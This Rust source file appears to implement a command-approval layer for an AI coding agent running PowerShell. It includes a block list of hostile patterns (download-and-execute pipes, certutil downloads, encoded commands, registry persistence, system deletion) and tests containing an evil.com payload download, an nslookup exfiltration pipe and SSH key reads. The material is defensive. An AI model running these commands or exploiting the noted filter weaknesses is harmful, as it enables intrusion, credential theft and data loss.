use crate::config::TrustedPattern;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ApprovalLevel {
    AutoApprove,
    NeedsConfirmation,
    Blocked,
}

// SAFETY NOTICE: The command filtering in this module is a **heuristic safety layer**
// (speed-bump), NOT a security sandbox. PowerShell provides many obfuscation techniques
// that can bypass simple string matching. For true sandboxing, consider running commands
// in a restricted runspace or a lower-privilege process.

/// Extract the primary command name from a PowerShell command string.
fn extract_command_name(cmd: &str) -> String {
    let trimmed = cmd.trim();

    if trimmed.starts_with('$') {
        return trimmed.to_lowercase();
    }

    let first_segment = trimmed.split('|').next().unwrap_or(trimmed).trim();
    let first_cmd = first_segment
        .split(';')
        .next()
        .unwrap_or(first_segment)
        .trim();

    let tokens: Vec<&str> = first_cmd.split_whitespace().collect();
    let mut token_idx = 0;

    if let Some(first) = tokens.first() {
        if *first == "&" || *first == "." || *first == ".\\" || *first == "./" {
            token_idx = 1;
        }
    }

    if token_idx >= tokens.len() {
        return trimmed.to_lowercase();
    }

    let mut token = tokens[token_idx];

    // Strip leading call operator & if attached to the command name
    if token.starts_with('&') && token.len() > 1 {
        token = &token[1..];
    }

    // Strip surrounding quotes
    let token_trimmed = token.trim_matches(|c| c == '"' || c == '\'');

    let first_cmd_clean = token_trimmed
        .strip_prefix(".\\")
        .or_else(|| token_trimmed.strip_prefix("./"))
        .unwrap_or(token_trimmed);

    let name = if first_cmd_clean.contains('\\') || first_cmd_clean.contains('/') {
        first_cmd_clean
            .rsplit(['\\', '/'])
            .next()
            .unwrap_or(first_cmd_clean)
    } else {
        first_cmd_clean
    };

    let name_trimmed = name.trim_matches(|c| c == '"' || c == '\'');
    let name_trimmed = name_trimmed
        .strip_suffix(".exe")
        .or_else(|| name_trimmed.strip_suffix(".ps1"))
        .or_else(|| name_trimmed.strip_suffix(".bat"))
        .or_else(|| name_trimmed.strip_suffix(".cmd"))
        .unwrap_or(name_trimmed);
    name_trimmed.to_lowercase()
}

/// Split a command into its chained segments (`;`, `&&`, `||`, `|`, newlines
/// — outside quotes) so each segment can be matched against the whitelist
/// independently, the way Claude Code approves `git status && git diff` when
/// both halves are allowed. Returns `None` when the command uses constructs
/// that could smuggle execution past per-segment matching: subexpressions
/// `$( )`/`@( )`, backticks, script blocks `{ }`, file redirects, background
/// `&`, or unbalanced quotes. `None` means "never auto-approve".
fn split_compound_segments(cmd: &str) -> Option<Vec<String>> {
    let chars: Vec<char> = cmd.chars().collect();
    let mut segments: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = 0usize;

    while i < chars.len() {
        let c = chars[i];
        let prev = if i > 0 { chars[i - 1] } else { ' ' };

        if c == '\'' && !in_double_quote && prev != '`' {
            in_single_quote = !in_single_quote;
            current.push(c);
            i += 1;
            continue;
        }
        if c == '"' && !in_single_quote && prev != '`' {
            in_double_quote = !in_double_quote;
            current.push(c);
            i += 1;
            continue;
        }
        if in_single_quote || in_double_quote {
            current.push(c);
            i += 1;
            continue;
        }

        match c {
            ';' | '\n' | '\r' => {
                segments.push(std::mem::take(&mut current));
                i += 1;
            }
            // `|` and `||` both separate segments; each side is checked.
            '|' => {
                segments.push(std::mem::take(&mut current));
                i += if chars.get(i + 1) == Some(&'|') { 2 } else { 1 };
            }
            '&' => {
                if chars.get(i + 1) == Some(&'&') {
                    segments.push(std::mem::take(&mut current));
                    i += 2;
                } else if current.trim().is_empty() {
                    // Call operator at segment start (`& script.ps1`) is fine;
                    // a script block `& { ... }` is not.
                    let mut j = i + 1;
                    while j < chars.len() && (chars[j] == ' ' || chars[j] == '\t') {
                        j += 1;
                    }
                    if chars.get(j) == Some(&'{') {
                        return None;
                    }
                    current.push(c);
                    i += 1;
                } else {
                    // Background job or other mid-command `&` — don't try to
                    // reason about it.
                    return None;
                }
            }
            // Backtick: PowerShell escape / line continuation / legacy
            // substitution. Never auto-approve.
            '`' => return None,
            '<' => return None,
            '>' => {
                // Pure stream redirections are harmless and extremely common
                // (`npm test 2>$null`, `cargo build 2>&1`); redirects to a
                // file are a write and disqualify the command instead.
                let mut j = i + 1;
                while j < chars.len() && chars[j] == ' ' {
                    j += 1;
                }
                let rest: String = chars[j..].iter().take(5).collect::<String>().to_lowercase();
                if rest.starts_with("$null") {
                    i = j + 5;
                } else if rest.starts_with("&1") || rest.starts_with("&2") {
                    i = j + 2;
                } else {
                    return None;
                }
            }
            '$' | '@' => {
                if chars.get(i + 1) == Some(&'(') {
                    return None;
                }
                current.push(c);
                i += 1;
            }
            // Script blocks (`ForEach-Object { ... }`) can wrap arbitrary
            // execution — never auto-approve.
            '{' => return None,
            _ => {
                current.push(c);
                i += 1;
            }
        }
    }

    if in_single_quote || in_double_quote {
        return None;
    }
    segments.push(current);
    Some(
        segments
            .into_iter()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect(),
    )
}

/// Compound-syntax check, kept for its established test surface: a command is
/// "compound" when it either cannot be split safely or splits into more than
/// one segment.
#[cfg(test)]
fn has_compound_syntax(cmd: &str) -> bool {
    match split_compound_segments(cmd) {
        None => true,
        Some(segments) => segments.len() > 1,
    }
}

/// Check if command contains dangerous variable usage that could bypass filters
fn has_dangerous_variable_usage(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();

    // Variable indirection patterns
    if cmd_lower.contains("$executioncontext") {
        return true;
    }

    // Get-Command followed by invocation
    if cmd_lower.contains("get-command")
        && (cmd_lower.contains("| &") || cmd_lower.contains(").invoke"))
    {
        return true;
    }

    // String building to bypass detection
    if cmd_lower.contains("-join") || cmd_lower.contains("-f ") {
        // Check if followed by execution
        if cmd_lower.contains("| iex") || cmd_lower.contains("| invoke-expression") {
            return true;
        }
    }

    false
}

fn command_has_arg(cmd: &str, names: &[&str]) -> bool {
    cmd.split_whitespace()
        .map(|part| part.trim_matches(|c| c == '"' || c == '\''))
        .any(|part| names.contains(&part))
}

fn is_powershell_command(cmd_name: &str) -> bool {
    matches!(cmd_name, "powershell" | "pwsh")
}

pub fn check_approval(
    tool_name: &str,
    args_str: &str,
    approval_policy: &str,
    trusted_patterns: &[TrustedPattern],
    work_dir: &str,
) -> ApprovalLevel {
    // 1. Check high-risk commands (blocklist as safety net)
    if is_high_risk(tool_name, args_str) {
        return ApprovalLevel::Blocked;
    }

    // 2. Read-only tools auto-approve
    let read_only = matches!(
        tool_name,
        "read_file" | "list_dir" | "web_search" | "grep" | "glob" | "todo_write"
    );
    if read_only {
        return ApprovalLevel::AutoApprove;
    }

    // 3. Check trusted patterns (whitelist). Shell commands that only read
    // files inside the workspace count as implicitly trusted — except under
    // the strict policy, where only the sandboxed builtin read tools skip
    // confirmation.
    let workspace_read_root = if approval_policy == "strict" {
        None
    } else {
        Some(work_dir)
    };
    if is_trusted(tool_name, args_str, trusted_patterns, workspace_read_root) {
        return ApprovalLevel::AutoApprove;
    }

    // 4. Strict policy: everything except reads needs confirmation
    if approval_policy == "strict" {
        return ApprovalLevel::NeedsConfirmation;
    }

    // 5. Relaxed policy maps to Claude Code's accept-edits mode: file writes
    // are auto-approved because their workspace boundary is hard-enforced in
    // tools.rs (resolve_within_workspace) and every write goes through a
    // pre-write checkpoint, so they are contained and undoable. Commands,
    // python, and MCP tools are neither, and still confirm.
    if approval_policy == "relaxed" && matches!(tool_name, "write_file" | "edit_file") {
        return ApprovalLevel::AutoApprove;
    }

    // 6. Everything reaching this point is a write, a command, or an MCP
    // tool (any name that isn't a builtin). MCP tools can execute arbitrary
    // code, so no policy blanket-approves them — they are treated at the
    // same level as execute_command.
    ApprovalLevel::NeedsConfirmation
}

/// Check if a command is high-risk and should be blocked.
fn is_high_risk(tool_name: &str, args_str: &str) -> bool {
    if tool_name != "execute_command" {
        return false;
    }

    let args: serde_json::Value = match serde_json::from_str(args_str) {
        Ok(v) => v,
        Err(_) => return false,
    };
    let cmd = match args["command"].as_str() {
        Some(c) => c,
        None => return false,
    };

    let cmd_lower = cmd.to_lowercase();
    let cmd_lower = cmd_lower.replace('/', "\\");
    let cmd_trimmed = cmd_lower.trim();

    // Extract the primary command name
    let cmd_name = extract_command_name(cmd_trimmed);

    // === Absolutely blocked executables ===
    let blocked_executables = [
        "format-volume",
        "remove-partition",
        "diskpart",
        "mshta",
        "wscript",
        "cscript",
        "regsvr32",
        "mofcomp",
        "rundll32",
        "installutil",
        "regasm",
        "regsvcs",
    ];
    if blocked_executables.contains(&cmd_name.as_str()) {
        return true;
    }

    // === Dangerous PowerShell cmdlets ===
    let blocked_cmdlets = [
        "set-executionpolicy",
        "stop-process",
        "enable-psremoting",
        "disable-psremoting",
        "enter-pssession",
        "new-pssession",
        "remove-service",
    ];
    if blocked_cmdlets.contains(&cmd_name.as_str()) {
        return true;
    }

    // === Dangerous command patterns ===
    let blocked_patterns = [
        // System directory deletion
        "remove-item c:\\windows",
        "del c:\\windows",
        "rm c:\\windows",
        "remove-item \"c:\\windows",
        "remove-item 'c:\\windows",
        "remove-item c:\\program files",
        "del c:\\program files",
        "rm c:\\program files",
        // Recursive force deletion
        "remove-item -recurse -force c:\\",
        "remove-item -r -force c:\\",
        // Account deletion
        "net user * /delete",
        "net user /delete",
        "remove-localuser",
        // Registry persistence / machine-wide modification
        "reg add hklm",
        "reg delete hklm",
        "set-itemproperty hklm:",
        "new-itemproperty hklm:",
        "remove-itemproperty hklm:",
        "set-itemproperty hkcu:\\software\\microsoft\\windows\\currentversion\\run",
        // Remote execution
        "curl | sh",
        "curl | bash",
        "curl|sh",
        "curl|bash",
        "wget | sh",
        "wget | bash",
        "irm | iex",
        "irm|iex",
        "iwr | iex",
        "iwr|iex",
        "invoke-restmethod | invoke-expression",
        "invoke-webrequest | invoke-expression",
        "| iex",
        "| invoke-expression",
        // certutil is useful for hashes, but these modes are execution/download helpers.
        "certutil -urlcache",
        "certutil.exe -urlcache",
        "certutil -decode",
        "certutil.exe -decode",
        // Catastrophic commands
        "rm -rf /",
        "rm -rf c:\\",
        "format c:",
        // Dangerous redirects
        "> c:\\windows",
        "> c:\\program files",
        // Reflective loading
        "[reflection.assembly]::load",
        "[system.reflection.assembly]::load",
    ];

    for pattern in &blocked_patterns {
        if cmd_trimmed.contains(pattern) {
            return true;
        }
    }

    if is_powershell_command(&cmd_name) {
        if command_has_arg(cmd_trimmed, &["-enc", "-encodedcommand", "-e"]) {
            return true;
        }
        if command_has_arg(cmd_trimmed, &["-w", "-windowstyle"]) && cmd_trimmed.contains("hidden") {
            return true;
        }
        if cmd_trimmed.contains("-noninteractive -nop")
            || cmd_trimmed.contains("-nop -noninteractive")
        {
            return true;
        }
    }

    if (cmd_trimmed.contains("[convert]::frombase64string")
        || cmd_trimmed.contains("[text.encoding]::utf8.getstring"))
        && (cmd_trimmed.contains(" iex") || cmd_trimmed.contains("invoke-expression"))
    {
        return true;
    }

    // Block invoke-expression
    if cmd_name == "invoke-expression" || cmd_name == "iex" {
        return true;
    }

    false
}

/// Check if a tool call matches a trusted pattern (whitelist).
///
/// For `execute_command`, the command is split into its chained segments and
/// every segment must independently be trusted — either by matching a
/// whitelist pattern or (when `workspace_read_root` is set) by being a
/// read-only command whose paths all stay inside the workspace. Commands
/// using un-splittable syntax (subexpressions, redirects, script blocks…)
/// are never trusted.
fn is_trusted(
    tool_name: &str,
    args_str: &str,
    patterns: &[TrustedPattern],
    workspace_read_root: Option<&str>,
) -> bool {
    match tool_name {
        "execute_command" => {
            let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) else {
                return false;
            };
            let Some(cmd) = args["command"].as_str() else {
                return false;
            };
            let cmd_trimmed = cmd.trim();

            // CRITICAL: Block dangerous variable usage
            if has_dangerous_variable_usage(cmd_trimmed) {
                return false;
            }

            let Some(segments) = split_compound_segments(cmd_trimmed) else {
                return false;
            };
            if segments.is_empty() {
                return false;
            }
            segments
                .iter()
                .all(|segment| command_segment_is_trusted(segment, patterns, workspace_read_root))
        }
        "write_file" | "edit_file" => {
            patterns
                .iter()
                .filter(|p| p.tool_name == tool_name)
                .any(|p| {
                    if let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) {
                        if let Some(path) = args["path"].as_str() {
                            return path.to_lowercase().starts_with(&p.pattern.to_lowercase());
                        }
                    }
                    false
                })
        }
        "run_python" => patterns
            .iter()
            .filter(|p| p.tool_name == tool_name)
            .any(|p| p.pattern == "*" || p.pattern == "run_python"),
        _ => false,
    }
}

/// Match a single (already split) command segment against the whitelist.
fn command_segment_is_trusted(
    segment: &str,
    patterns: &[TrustedPattern],
    workspace_read_root: Option<&str>,
) -> bool {
    if let Some(root) = workspace_read_root {
        if is_workspace_scoped_read(segment, root) {
            return true;
        }
    }

    let cmd_lower = segment.to_lowercase();
    for p in patterns.iter().filter(|p| p.tool_name == "execute_command") {
        let pattern_trimmed = p.pattern.trim();
        let pattern_lower = pattern_trimmed.to_lowercase();
        if pattern_lower.is_empty() {
            continue;
        }

        if cmd_lower == pattern_lower {
            return true;
        }

        // Environment variable reads use PowerShell's $env:NAME syntax.
        // Chaining characters cannot appear here: segment splitting already
        // consumed them.
        if pattern_lower.ends_with(':') && cmd_lower.starts_with(&pattern_lower) {
            return true;
        }

        // For patterns with arguments, require exact prefix + space
        if cmd_lower.starts_with(&pattern_lower) {
            let remainder = &cmd_lower[pattern_lower.len()..];
            if remainder.is_empty() || remainder.starts_with(' ') {
                return true;
            }
        }

        // Also match by extracted command name for simple commands
        if !segment.contains(' ')
            && extract_command_name(segment) == extract_command_name(pattern_trimmed)
        {
            return true;
        }
    }
    false
}

/// Read-only commands that are auto-approved when every path they touch stays
/// inside the workspace. This mirrors the builtin read tools' sandbox: the
/// model reading its own project should never prompt, reading ~/.ssh should.
const WORKSPACE_READ_COMMANDS: &[&str] = &[
    "get-content",
    "gc",
    "cat",
    "type",
    "select-string",
    "sls",
    "findstr",
    "more",
];

fn is_workspace_scoped_read(segment: &str, workspace_root: &str) -> bool {
    let root = workspace_root.trim();
    if root.is_empty() {
        return false;
    }
    let name = extract_command_name(segment);
    if !WORKSPACE_READ_COMMANDS.contains(&name.as_str()) {
        return false;
    }

    let root_norm = normalize_path_for_prefix(root);
    let mut command_token_seen = false;
    for token in segment.split_whitespace() {
        if !command_token_seen {
            if token == "&" || token == "." {
                continue;
            }
            command_token_seen = true; // this token is the command itself
            continue;
        }
        let arg = token.trim_matches(|c| c == '"' || c == '\'');
        if arg.is_empty() || arg.starts_with('-') {
            continue; // PowerShell-style flag
        }
        if arg.contains("..") {
            return false; // parent traversal
        }
        if arg.starts_with('~') {
            return false; // home directory
        }
        if arg.contains('$') || arg.contains('%') {
            return false; // variable / env expansion
        }
        if arg.starts_with('\\') || arg.starts_with('/') {
            return false; // UNC, root-relative, or cmd-style flag — just prompt
        }
        let bytes = arg.as_bytes();
        let has_drive = bytes.len() >= 2 && bytes[1] == b':' && bytes[0].is_ascii_alphabetic();
        if has_drive {
            let arg_norm = normalize_path_for_prefix(arg);
            if !path_has_prefix(&arg_norm, &root_norm) {
                return false; // absolute path outside the workspace
            }
        }
        // Anything else is a plain relative token: it resolves under the
        // working directory (execute_command runs with cwd = workspace).
    }
    true
}

fn normalize_path_for_prefix(p: &str) -> String {
    let mut s = p.replace('/', "\\").to_lowercase();
    while s.ends_with('\\') {
        s.pop();
    }
    s
}

fn path_has_prefix(path: &str, root: &str) -> bool {
    path == root || (path.starts_with(root) && path[root.len()..].starts_with('\\'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_command_name() {
        assert_eq!(extract_command_name("Get-ChildItem"), "get-childitem");
        assert_eq!(extract_command_name("git status"), "git");
        assert_eq!(extract_command_name("npm list --depth=0"), "npm");
        assert_eq!(
            extract_command_name("C:\\Python\\python.exe script.py"),
            "python"
        );
        assert_eq!(extract_command_name(".\\build.ps1"), "build");
        assert_eq!(extract_command_name("echo hello | Out-File"), "echo");
        assert_eq!(extract_command_name("dir; Remove-Item x"), "dir");
        assert_eq!(extract_command_name("&certutil -urlcache"), "certutil");
        assert_eq!(extract_command_name("&\"certutil\" -urlcache"), "certutil");
        assert_eq!(extract_command_name("& \"certutil\" -urlcache"), "certutil");
    }

    #[test]
    fn test_compound_syntax_detection() {
        assert!(has_compound_syntax("git status; rm file.txt"));
        assert!(has_compound_syntax("echo test | Out-File"));
        assert!(has_compound_syntax("ls `\n rm x"));
        assert!(has_compound_syntax("$cmd = 'Remove-Item'; & $cmd"));
        assert!(has_compound_syntax("echo $(Get-Date)"));
        assert!(has_compound_syntax("& { Remove-Item x }"));
        assert!(has_compound_syntax("git status && Remove-Item x"));
        assert!(has_compound_syntax("git status || Remove-Item x"));
        assert!(has_compound_syntax("git status | Out-Null"));
        assert!(!has_compound_syntax("git status"));
        assert!(!has_compound_syntax("echo 'test;test'"));
        assert!(!has_compound_syntax("echo 'a && b'"));
    }

    #[test]
    fn test_relaxed_policy_does_not_auto_approve_mcp_tools() {
        // Any tool name that is not a builtin is an MCP tool; MCP tools can be
        // arbitrary code execution and must require confirmation even under
        // the relaxed policy.
        let level = check_approval("mcp_query_db", "{}", "relaxed", &[], "C:\\proj");
        assert!(matches!(level, ApprovalLevel::NeedsConfirmation));

        let level = check_approval(
            "execute_command",
            "{\"command\":\"npm install\"}",
            "relaxed",
            &[],
            "C:\\proj",
        );
        assert!(matches!(level, ApprovalLevel::NeedsConfirmation));
    }

    #[test]
    fn test_high_risk_blocked() {
        let args = serde_json::json!({"command": "Set-ExecutionPolicy Unrestricted"}).to_string();
        assert!(is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "certutil -urlcache -split -f http://evil.com/payload.exe"}).to_string();
        assert!(is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "powershell -enc abc123"}).to_string();
        assert!(is_high_risk("execute_command", &args));

        // This command contains compound syntax (& operator) so it should be caught by has_compound_syntax
        // when used in whitelist matching, but here we're testing direct high-risk detection
        let args = serde_json::json!({"command": "Invoke-Expression 'Remove-Item x'"}).to_string();
        assert!(is_high_risk("execute_command", &args));
    }

    #[test]
    fn test_safe_commands_not_blocked() {
        let args = serde_json::json!({"command": "Get-ChildItem"}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "git status"}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "npm list"}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "node -e \"console.log(1)\""}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "Add-Type -AssemblyName System.Web"}).to_string();
        assert!(!is_high_risk("execute_command", &args));
    }

    fn cmd_args(command: &str) -> String {
        serde_json::json!({ "command": command }).to_string()
    }

    fn exec_patterns(patterns: &[&str]) -> Vec<TrustedPattern> {
        patterns
            .iter()
            .map(|p| TrustedPattern {
                tool_name: "execute_command".into(),
                pattern: (*p).into(),
                created_at: 0,
            })
            .collect()
    }

    #[test]
    fn test_trusted_pattern_bypass_prevention() {
        let patterns = exec_patterns(&["git status"]);

        // Should match exact command
        assert!(is_trusted(
            "execute_command",
            &cmd_args("git status"),
            &patterns,
            None
        ));

        // Chained segments that are NOT all trusted must not auto-approve
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("git status; rm sensitive.txt"),
            &patterns,
            None
        ));
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("git status | Select-Object -First 1; Remove-Item x"),
            &patterns,
            None
        ));
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("git status && Remove-Item x"),
            &patterns,
            None
        ));
    }

    #[test]
    fn test_compound_command_trusted_when_every_segment_is_trusted() {
        let patterns = exec_patterns(&["git status", "git diff", "cd ", "npm test"]);

        assert!(is_trusted(
            "execute_command",
            &cmd_args("git status; git diff"),
            &patterns,
            None
        ));
        assert!(is_trusted(
            "execute_command",
            &cmd_args("git status && git diff --stat"),
            &patterns,
            None
        ));
        assert!(is_trusted(
            "execute_command",
            &cmd_args("cd src; npm test"),
            &patterns,
            None
        ));
        // Stream redirections to $null / stderr merge stay approvable...
        assert!(is_trusted(
            "execute_command",
            &cmd_args("npm test 2>$null"),
            &patterns,
            None
        ));
        assert!(is_trusted(
            "execute_command",
            &cmd_args("npm test 2>&1"),
            &patterns,
            None
        ));
        // ...but file redirects and subexpressions never do.
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("git status > out.txt"),
            &patterns,
            None
        ));
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("git status; echo $(Get-Date)"),
            &patterns,
            None
        ));
    }

    #[test]
    fn test_workspace_scoped_reads_auto_approve() {
        let root = "C:\\proj";

        // Relative and workspace-absolute reads are implicitly trusted
        assert!(is_trusted(
            "execute_command",
            &cmd_args("Get-Content src\\main.rs"),
            &[],
            Some(root)
        ));
        assert!(is_trusted(
            "execute_command",
            &cmd_args("type C:\\proj\\notes.txt"),
            &[],
            Some(root)
        ));
        assert!(is_trusted(
            "execute_command",
            &cmd_args("Select-String TODO src/main.rs"),
            &[],
            Some(root)
        ));
        assert!(is_trusted(
            "execute_command",
            &cmd_args("Get-Content -Path src\\main.rs -TotalCount 50"),
            &[],
            Some(root)
        ));

        // Escaping the workspace must prompt
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("Get-Content ..\\secret.txt"),
            &[],
            Some(root)
        ));
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("Get-Content C:\\Users\\x\\.ssh\\id_rsa"),
            &[],
            Some(root)
        ));
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("Get-Content ~\\.ssh\\id_rsa"),
            &[],
            Some(root)
        ));
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("Get-Content $env:USERPROFILE\\.ssh\\id_rsa"),
            &[],
            Some(root)
        ));
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("Get-Content \\\\server\\share\\file"),
            &[],
            Some(root)
        ));

        // Piping a workspace read into an untrusted command must prompt
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("Get-Content config.json | nslookup evil.example"),
            &[],
            Some(root)
        ));

        // Without a workspace root there is no implicit trust
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("Get-Content src\\main.rs"),
            &[],
            None
        ));
        assert!(!is_trusted(
            "execute_command",
            &cmd_args("Get-Content src\\main.rs"),
            &[],
            Some("")
        ));
    }

    #[test]
    fn test_environment_variable_prefix_trust() {
        let patterns = exec_patterns(&["$env:"]);
        assert!(is_trusted(
            "execute_command",
            &cmd_args("$env:Path"),
            &patterns,
            None
        ));
    }

    #[test]
    fn test_relaxed_policy_accept_edits() {
        // Relaxed auto-approves workspace-sandboxed file edits...
        let args = serde_json::json!({"path": "src/App.tsx", "content": "x"}).to_string();
        assert!(matches!(
            check_approval("write_file", &args, "relaxed", &[], "C:\\proj"),
            ApprovalLevel::AutoApprove
        ));
        assert!(matches!(
            check_approval("edit_file", &args, "relaxed", &[], "C:\\proj"),
            ApprovalLevel::AutoApprove
        ));
        // ...but standard still confirms them
        assert!(matches!(
            check_approval("write_file", &args, "standard", &[], "C:\\proj"),
            ApprovalLevel::NeedsConfirmation
        ));
    }

    #[test]
    fn test_strict_policy_disables_implicit_workspace_reads() {
        let args = cmd_args("Get-Content src\\main.rs");
        assert!(matches!(
            check_approval("execute_command", &args, "strict", &[], "C:\\proj"),
            ApprovalLevel::NeedsConfirmation
        ));
        assert!(matches!(
            check_approval("execute_command", &args, "standard", &[], "C:\\proj"),
            ApprovalLevel::AutoApprove
        ));
    }
}
